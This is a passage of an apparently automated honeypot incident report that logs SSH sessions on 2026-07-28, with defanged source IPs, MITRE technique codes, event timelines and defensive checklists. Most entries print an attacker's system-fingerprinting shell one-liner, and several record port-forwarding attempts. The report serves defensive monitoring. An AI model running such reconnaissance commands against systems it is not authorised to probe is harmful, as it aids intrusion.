| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:20:26` | `cowrie.session.connect` |
| `2026-07-28 13:20:26` | `cowrie.client.version` |
| `2026-07-28 13:20:26` | `cowrie.client.kex` |
| `2026-07-28 13:20:32` | `cowrie.login.success` |
| `2026-07-28 13:20:35` | `cowrie.session.params` |
| `2026-07-28 13:20:35` | `cowrie.command.input` |
| `2026-07-28 13:20:35` | `cowrie.command.input` |
| `2026-07-28 13:20:35` | `cowrie.command.input` |
| `2026-07-28 13:20:35` | `cowrie.command.input` |
| `2026-07-28 13:20:35` | `cowrie.command.input` |
| `2026-07-28 13:20:35` | `cowrie.command.success` |
| `2026-07-28 13:20:35` | `cowrie.command.input` |
| `2026-07-28 13:20:35` | `cowrie.command.input` |
| `2026-07-28 13:20:35` | `cowrie.command.input` |
| `2026-07-28 13:20:35` | `cowrie.command.input` |
| `2026-07-28 13:20:36` | `cowrie.log.closed` |
| `2026-07-28 13:20:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a68c2722d4c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:21 |
| **Last Seen** | 2026-07-28 13:21 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:21:37` | `cowrie.session.connect` |
| `2026-07-28 13:21:38` | `cowrie.client.version` |
| `2026-07-28 13:21:38` | `cowrie.client.kex` |
| `2026-07-28 13:21:43` | `cowrie.login.success` |
| `2026-07-28 13:21:46` | `cowrie.session.params` |
| `2026-07-28 13:21:46` | `cowrie.command.input` |
| `2026-07-28 13:21:46` | `cowrie.command.input` |
| `2026-07-28 13:21:46` | `cowrie.command.input` |
| `2026-07-28 13:21:46` | `cowrie.command.input` |
| `2026-07-28 13:21:46` | `cowrie.command.input` |
| `2026-07-28 13:21:46` | `cowrie.command.success` |
| `2026-07-28 13:21:46` | `cowrie.command.input` |
| `2026-07-28 13:21:46` | `cowrie.command.input` |
| `2026-07-28 13:21:46` | `cowrie.command.input` |
| `2026-07-28 13:21:46` | `cowrie.command.input` |
| `2026-07-28 13:21:48` | `cowrie.log.closed` |
| `2026-07-28 13:21:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4d6f6a4c06d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 13:22 |
| **Last Seen** | 2026-07-28 13:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:22:43` | `cowrie.session.connect` |
| `2026-07-28 13:22:43` | `cowrie.client.version` |
| `2026-07-28 13:22:43` | `cowrie.client.kex` |
| `2026-07-28 13:22:43` | `cowrie.login.success` |
| `2026-07-28 13:22:43` | `cowrie.direct-tcpip.request` |
| `2026-07-28 13:22:43` | `cowrie.direct-tcpip.data` |
| `2026-07-28 13:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bab6a8ff872a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:22 |
| **Last Seen** | 2026-07-28 13:22 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:22:47` | `cowrie.session.connect` |
| `2026-07-28 13:22:48` | `cowrie.client.version` |
| `2026-07-28 13:22:48` | `cowrie.client.kex` |
| `2026-07-28 13:22:53` | `cowrie.login.success` |
| `2026-07-28 13:22:57` | `cowrie.session.params` |
| `2026-07-28 13:22:57` | `cowrie.command.input` |
| `2026-07-28 13:22:57` | `cowrie.command.input` |
| `2026-07-28 13:22:57` | `cowrie.command.input` |
| `2026-07-28 13:22:57` | `cowrie.command.input` |
| `2026-07-28 13:22:57` | `cowrie.command.input` |
| `2026-07-28 13:22:57` | `cowrie.command.success` |
| `2026-07-28 13:22:57` | `cowrie.command.input` |
| `2026-07-28 13:22:57` | `cowrie.command.input` |
| `2026-07-28 13:22:57` | `cowrie.command.input` |
| `2026-07-28 13:22:57` | `cowrie.command.input` |
| `2026-07-28 13:22:58` | `cowrie.log.closed` |
| `2026-07-28 13:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e840b33e757

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:24 |
| **Last Seen** | 2026-07-28 13:24 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:24:00` | `cowrie.session.connect` |
| `2026-07-28 13:24:01` | `cowrie.client.version` |
| `2026-07-28 13:24:01` | `cowrie.client.kex` |
| `2026-07-28 13:24:06` | `cowrie.login.success` |
| `2026-07-28 13:24:09` | `cowrie.session.params` |
| `2026-07-28 13:24:09` | `cowrie.command.input` |
| `2026-07-28 13:24:09` | `cowrie.command.input` |
| `2026-07-28 13:24:09` | `cowrie.command.input` |
| `2026-07-28 13:24:09` | `cowrie.command.input` |
| `2026-07-28 13:24:09` | `cowrie.command.input` |
| `2026-07-28 13:24:09` | `cowrie.command.success` |
| `2026-07-28 13:24:09` | `cowrie.command.input` |
| `2026-07-28 13:24:09` | `cowrie.command.input` |
| `2026-07-28 13:24:09` | `cowrie.command.input` |
| `2026-07-28 13:24:09` | `cowrie.command.input` |
| `2026-07-28 13:24:10` | `cowrie.log.closed` |
| `2026-07-28 13:24:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4ab414ec98c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:25 |
| **Last Seen** | 2026-07-28 13:25 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:25:13` | `cowrie.session.connect` |
| `2026-07-28 13:25:14` | `cowrie.client.version` |
| `2026-07-28 13:25:14` | `cowrie.client.kex` |
| `2026-07-28 13:25:19` | `cowrie.login.success` |
| `2026-07-28 13:25:22` | `cowrie.session.params` |
| `2026-07-28 13:25:22` | `cowrie.command.input` |
| `2026-07-28 13:25:22` | `cowrie.command.input` |
| `2026-07-28 13:25:22` | `cowrie.command.input` |
| `2026-07-28 13:25:22` | `cowrie.command.input` |
| `2026-07-28 13:25:22` | `cowrie.command.input` |
| `2026-07-28 13:25:22` | `cowrie.command.success` |
| `2026-07-28 13:25:22` | `cowrie.command.input` |
| `2026-07-28 13:25:22` | `cowrie.command.input` |
| `2026-07-28 13:25:22` | `cowrie.command.input` |
| `2026-07-28 13:25:22` | `cowrie.command.input` |
| `2026-07-28 13:25:23` | `cowrie.log.closed` |
| `2026-07-28 13:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44b16ae029df

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:26 |
| **Last Seen** | 2026-07-28 13:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:26:24` | `cowrie.session.connect` |
| `2026-07-28 13:26:25` | `cowrie.client.version` |
| `2026-07-28 13:26:25` | `cowrie.client.kex` |
| `2026-07-28 13:26:30` | `cowrie.login.success` |
| `2026-07-28 13:26:33` | `cowrie.session.params` |
| `2026-07-28 13:26:33` | `cowrie.command.input` |
| `2026-07-28 13:26:33` | `cowrie.command.input` |
| `2026-07-28 13:26:33` | `cowrie.command.input` |
| `2026-07-28 13:26:33` | `cowrie.command.input` |
| `2026-07-28 13:26:33` | `cowrie.command.input` |
| `2026-07-28 13:26:33` | `cowrie.command.success` |
| `2026-07-28 13:26:33` | `cowrie.command.input` |
| `2026-07-28 13:26:33` | `cowrie.command.input` |
| `2026-07-28 13:26:33` | `cowrie.command.input` |
| `2026-07-28 13:26:33` | `cowrie.command.input` |
| `2026-07-28 13:26:34` | `cowrie.log.closed` |
| `2026-07-28 13:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-251be8291d1d

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-28 13:27 |
| **Last Seen** | 2026-07-28 13:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:27:17` | `cowrie.session.connect` |
| `2026-07-28 13:27:17` | `cowrie.client.version` |
| `2026-07-28 13:27:17` | `cowrie.client.kex` |
| `2026-07-28 13:27:18` | `cowrie.login.success` |
| `2026-07-28 13:27:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1afd6281ff06

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-28 13:27 |
| **Last Seen** | 2026-07-28 13:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:27:18` | `cowrie.session.connect` |
| `2026-07-28 13:27:18` | `cowrie.client.version` |
| `2026-07-28 13:27:18` | `cowrie.client.kex` |
| `2026-07-28 13:27:19` | `cowrie.login.success` |
| `2026-07-28 13:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20c29184fad5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:27 |
| **Last Seen** | 2026-07-28 13:27 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:27:38` | `cowrie.session.connect` |
| `2026-07-28 13:27:39` | `cowrie.client.version` |
| `2026-07-28 13:27:39` | `cowrie.client.kex` |
| `2026-07-28 13:27:44` | `cowrie.login.success` |
| `2026-07-28 13:27:46` | `cowrie.session.params` |
| `2026-07-28 13:27:46` | `cowrie.command.input` |
| `2026-07-28 13:27:46` | `cowrie.command.input` |
| `2026-07-28 13:27:46` | `cowrie.command.input` |
| `2026-07-28 13:27:46` | `cowrie.command.input` |
| `2026-07-28 13:27:46` | `cowrie.command.input` |
| `2026-07-28 13:27:46` | `cowrie.command.success` |
| `2026-07-28 13:27:46` | `cowrie.command.input` |
| `2026-07-28 13:27:46` | `cowrie.command.input` |
| `2026-07-28 13:27:46` | `cowrie.command.input` |
| `2026-07-28 13:27:46` | `cowrie.command.input` |
| `2026-07-28 13:27:48` | `cowrie.log.closed` |
| `2026-07-28 13:27:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64fe3e6fe62f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:28 |
| **Last Seen** | 2026-07-28 13:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:28:52` | `cowrie.session.connect` |
| `2026-07-28 13:28:53` | `cowrie.client.version` |
| `2026-07-28 13:28:53` | `cowrie.client.kex` |
| `2026-07-28 13:28:57` | `cowrie.login.success` |
| `2026-07-28 13:29:00` | `cowrie.session.params` |
| `2026-07-28 13:29:00` | `cowrie.command.input` |
| `2026-07-28 13:29:00` | `cowrie.command.input` |
| `2026-07-28 13:29:00` | `cowrie.command.input` |
| `2026-07-28 13:29:00` | `cowrie.command.input` |
| `2026-07-28 13:29:00` | `cowrie.command.input` |
| `2026-07-28 13:29:00` | `cowrie.command.success` |
| `2026-07-28 13:29:00` | `cowrie.command.input` |
| `2026-07-28 13:29:00` | `cowrie.command.input` |
| `2026-07-28 13:29:00` | `cowrie.command.input` |
| `2026-07-28 13:29:00` | `cowrie.command.input` |
| `2026-07-28 13:29:02` | `cowrie.log.closed` |
| `2026-07-28 13:29:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38e82581e80c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:30 |
| **Last Seen** | 2026-07-28 13:30 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:30:05` | `cowrie.session.connect` |
| `2026-07-28 13:30:06` | `cowrie.client.version` |
| `2026-07-28 13:30:06` | `cowrie.client.kex` |
| `2026-07-28 13:30:11` | `cowrie.login.success` |
| `2026-07-28 13:30:14` | `cowrie.session.params` |
| `2026-07-28 13:30:14` | `cowrie.command.input` |
| `2026-07-28 13:30:14` | `cowrie.command.input` |
| `2026-07-28 13:30:14` | `cowrie.command.input` |
| `2026-07-28 13:30:14` | `cowrie.command.input` |
| `2026-07-28 13:30:14` | `cowrie.command.input` |
| `2026-07-28 13:30:14` | `cowrie.command.success` |
| `2026-07-28 13:30:14` | `cowrie.command.input` |
| `2026-07-28 13:30:14` | `cowrie.command.input` |
| `2026-07-28 13:30:14` | `cowrie.command.input` |
| `2026-07-28 13:30:14` | `cowrie.command.input` |
| `2026-07-28 13:30:15` | `cowrie.log.closed` |
| `2026-07-28 13:30:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59c70f24b2b0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:31 |
| **Last Seen** | 2026-07-28 13:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:31:19` | `cowrie.session.connect` |
| `2026-07-28 13:31:20` | `cowrie.client.version` |
| `2026-07-28 13:31:20` | `cowrie.client.kex` |
| `2026-07-28 13:31:23` | `cowrie.login.success` |
| `2026-07-28 13:31:25` | `cowrie.session.params` |
| `2026-07-28 13:31:25` | `cowrie.command.input` |
| `2026-07-28 13:31:25` | `cowrie.command.input` |
| `2026-07-28 13:31:25` | `cowrie.command.input` |
| `2026-07-28 13:31:25` | `cowrie.command.input` |
| `2026-07-28 13:31:25` | `cowrie.command.input` |
| `2026-07-28 13:31:25` | `cowrie.command.success` |
| `2026-07-28 13:31:25` | `cowrie.command.input` |
| `2026-07-28 13:31:25` | `cowrie.command.input` |
| `2026-07-28 13:31:25` | `cowrie.command.input` |
| `2026-07-28 13:31:25` | `cowrie.command.input` |
| `2026-07-28 13:31:26` | `cowrie.log.closed` |
| `2026-07-28 13:31:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b095641de2dc

| Field | Detail |
|---|---|
| **Source IP** | `41.214.10[.]178` |
| **First Seen** | 2026-07-28 13:31 |
| **Last Seen** | 2026-07-28 13:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:31:54` | `cowrie.session.connect` |
| `2026-07-28 13:31:54` | `cowrie.client.version` |
| `2026-07-28 13:31:54` | `cowrie.client.kex` |
| `2026-07-28 13:31:55` | `cowrie.login.success` |
| `2026-07-28 13:31:56` | `cowrie.direct-tcpip.request` |
| `2026-07-28 13:32:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.214.10[.]178` to AbuseIPDB if not already reported
- [ ] Block `41.214.10[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cca93029b617

| Field | Detail |
|---|---|
| **Source IP** | `114.30.180[.]58` |
| **First Seen** | 2026-07-28 13:32 |
| **Last Seen** | 2026-07-28 13:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:32:01` | `cowrie.session.connect` |
| `2026-07-28 13:32:02` | `cowrie.client.version` |
| `2026-07-28 13:32:02` | `cowrie.client.kex` |
| `2026-07-28 13:32:04` | `cowrie.login.success` |
| `2026-07-28 13:32:04` | `cowrie.direct-tcpip.request` |
| `2026-07-28 13:32:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.180[.]58` to AbuseIPDB if not already reported
- [ ] Block `114.30.180[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df4ab75e2985

| Field | Detail |
|---|---|
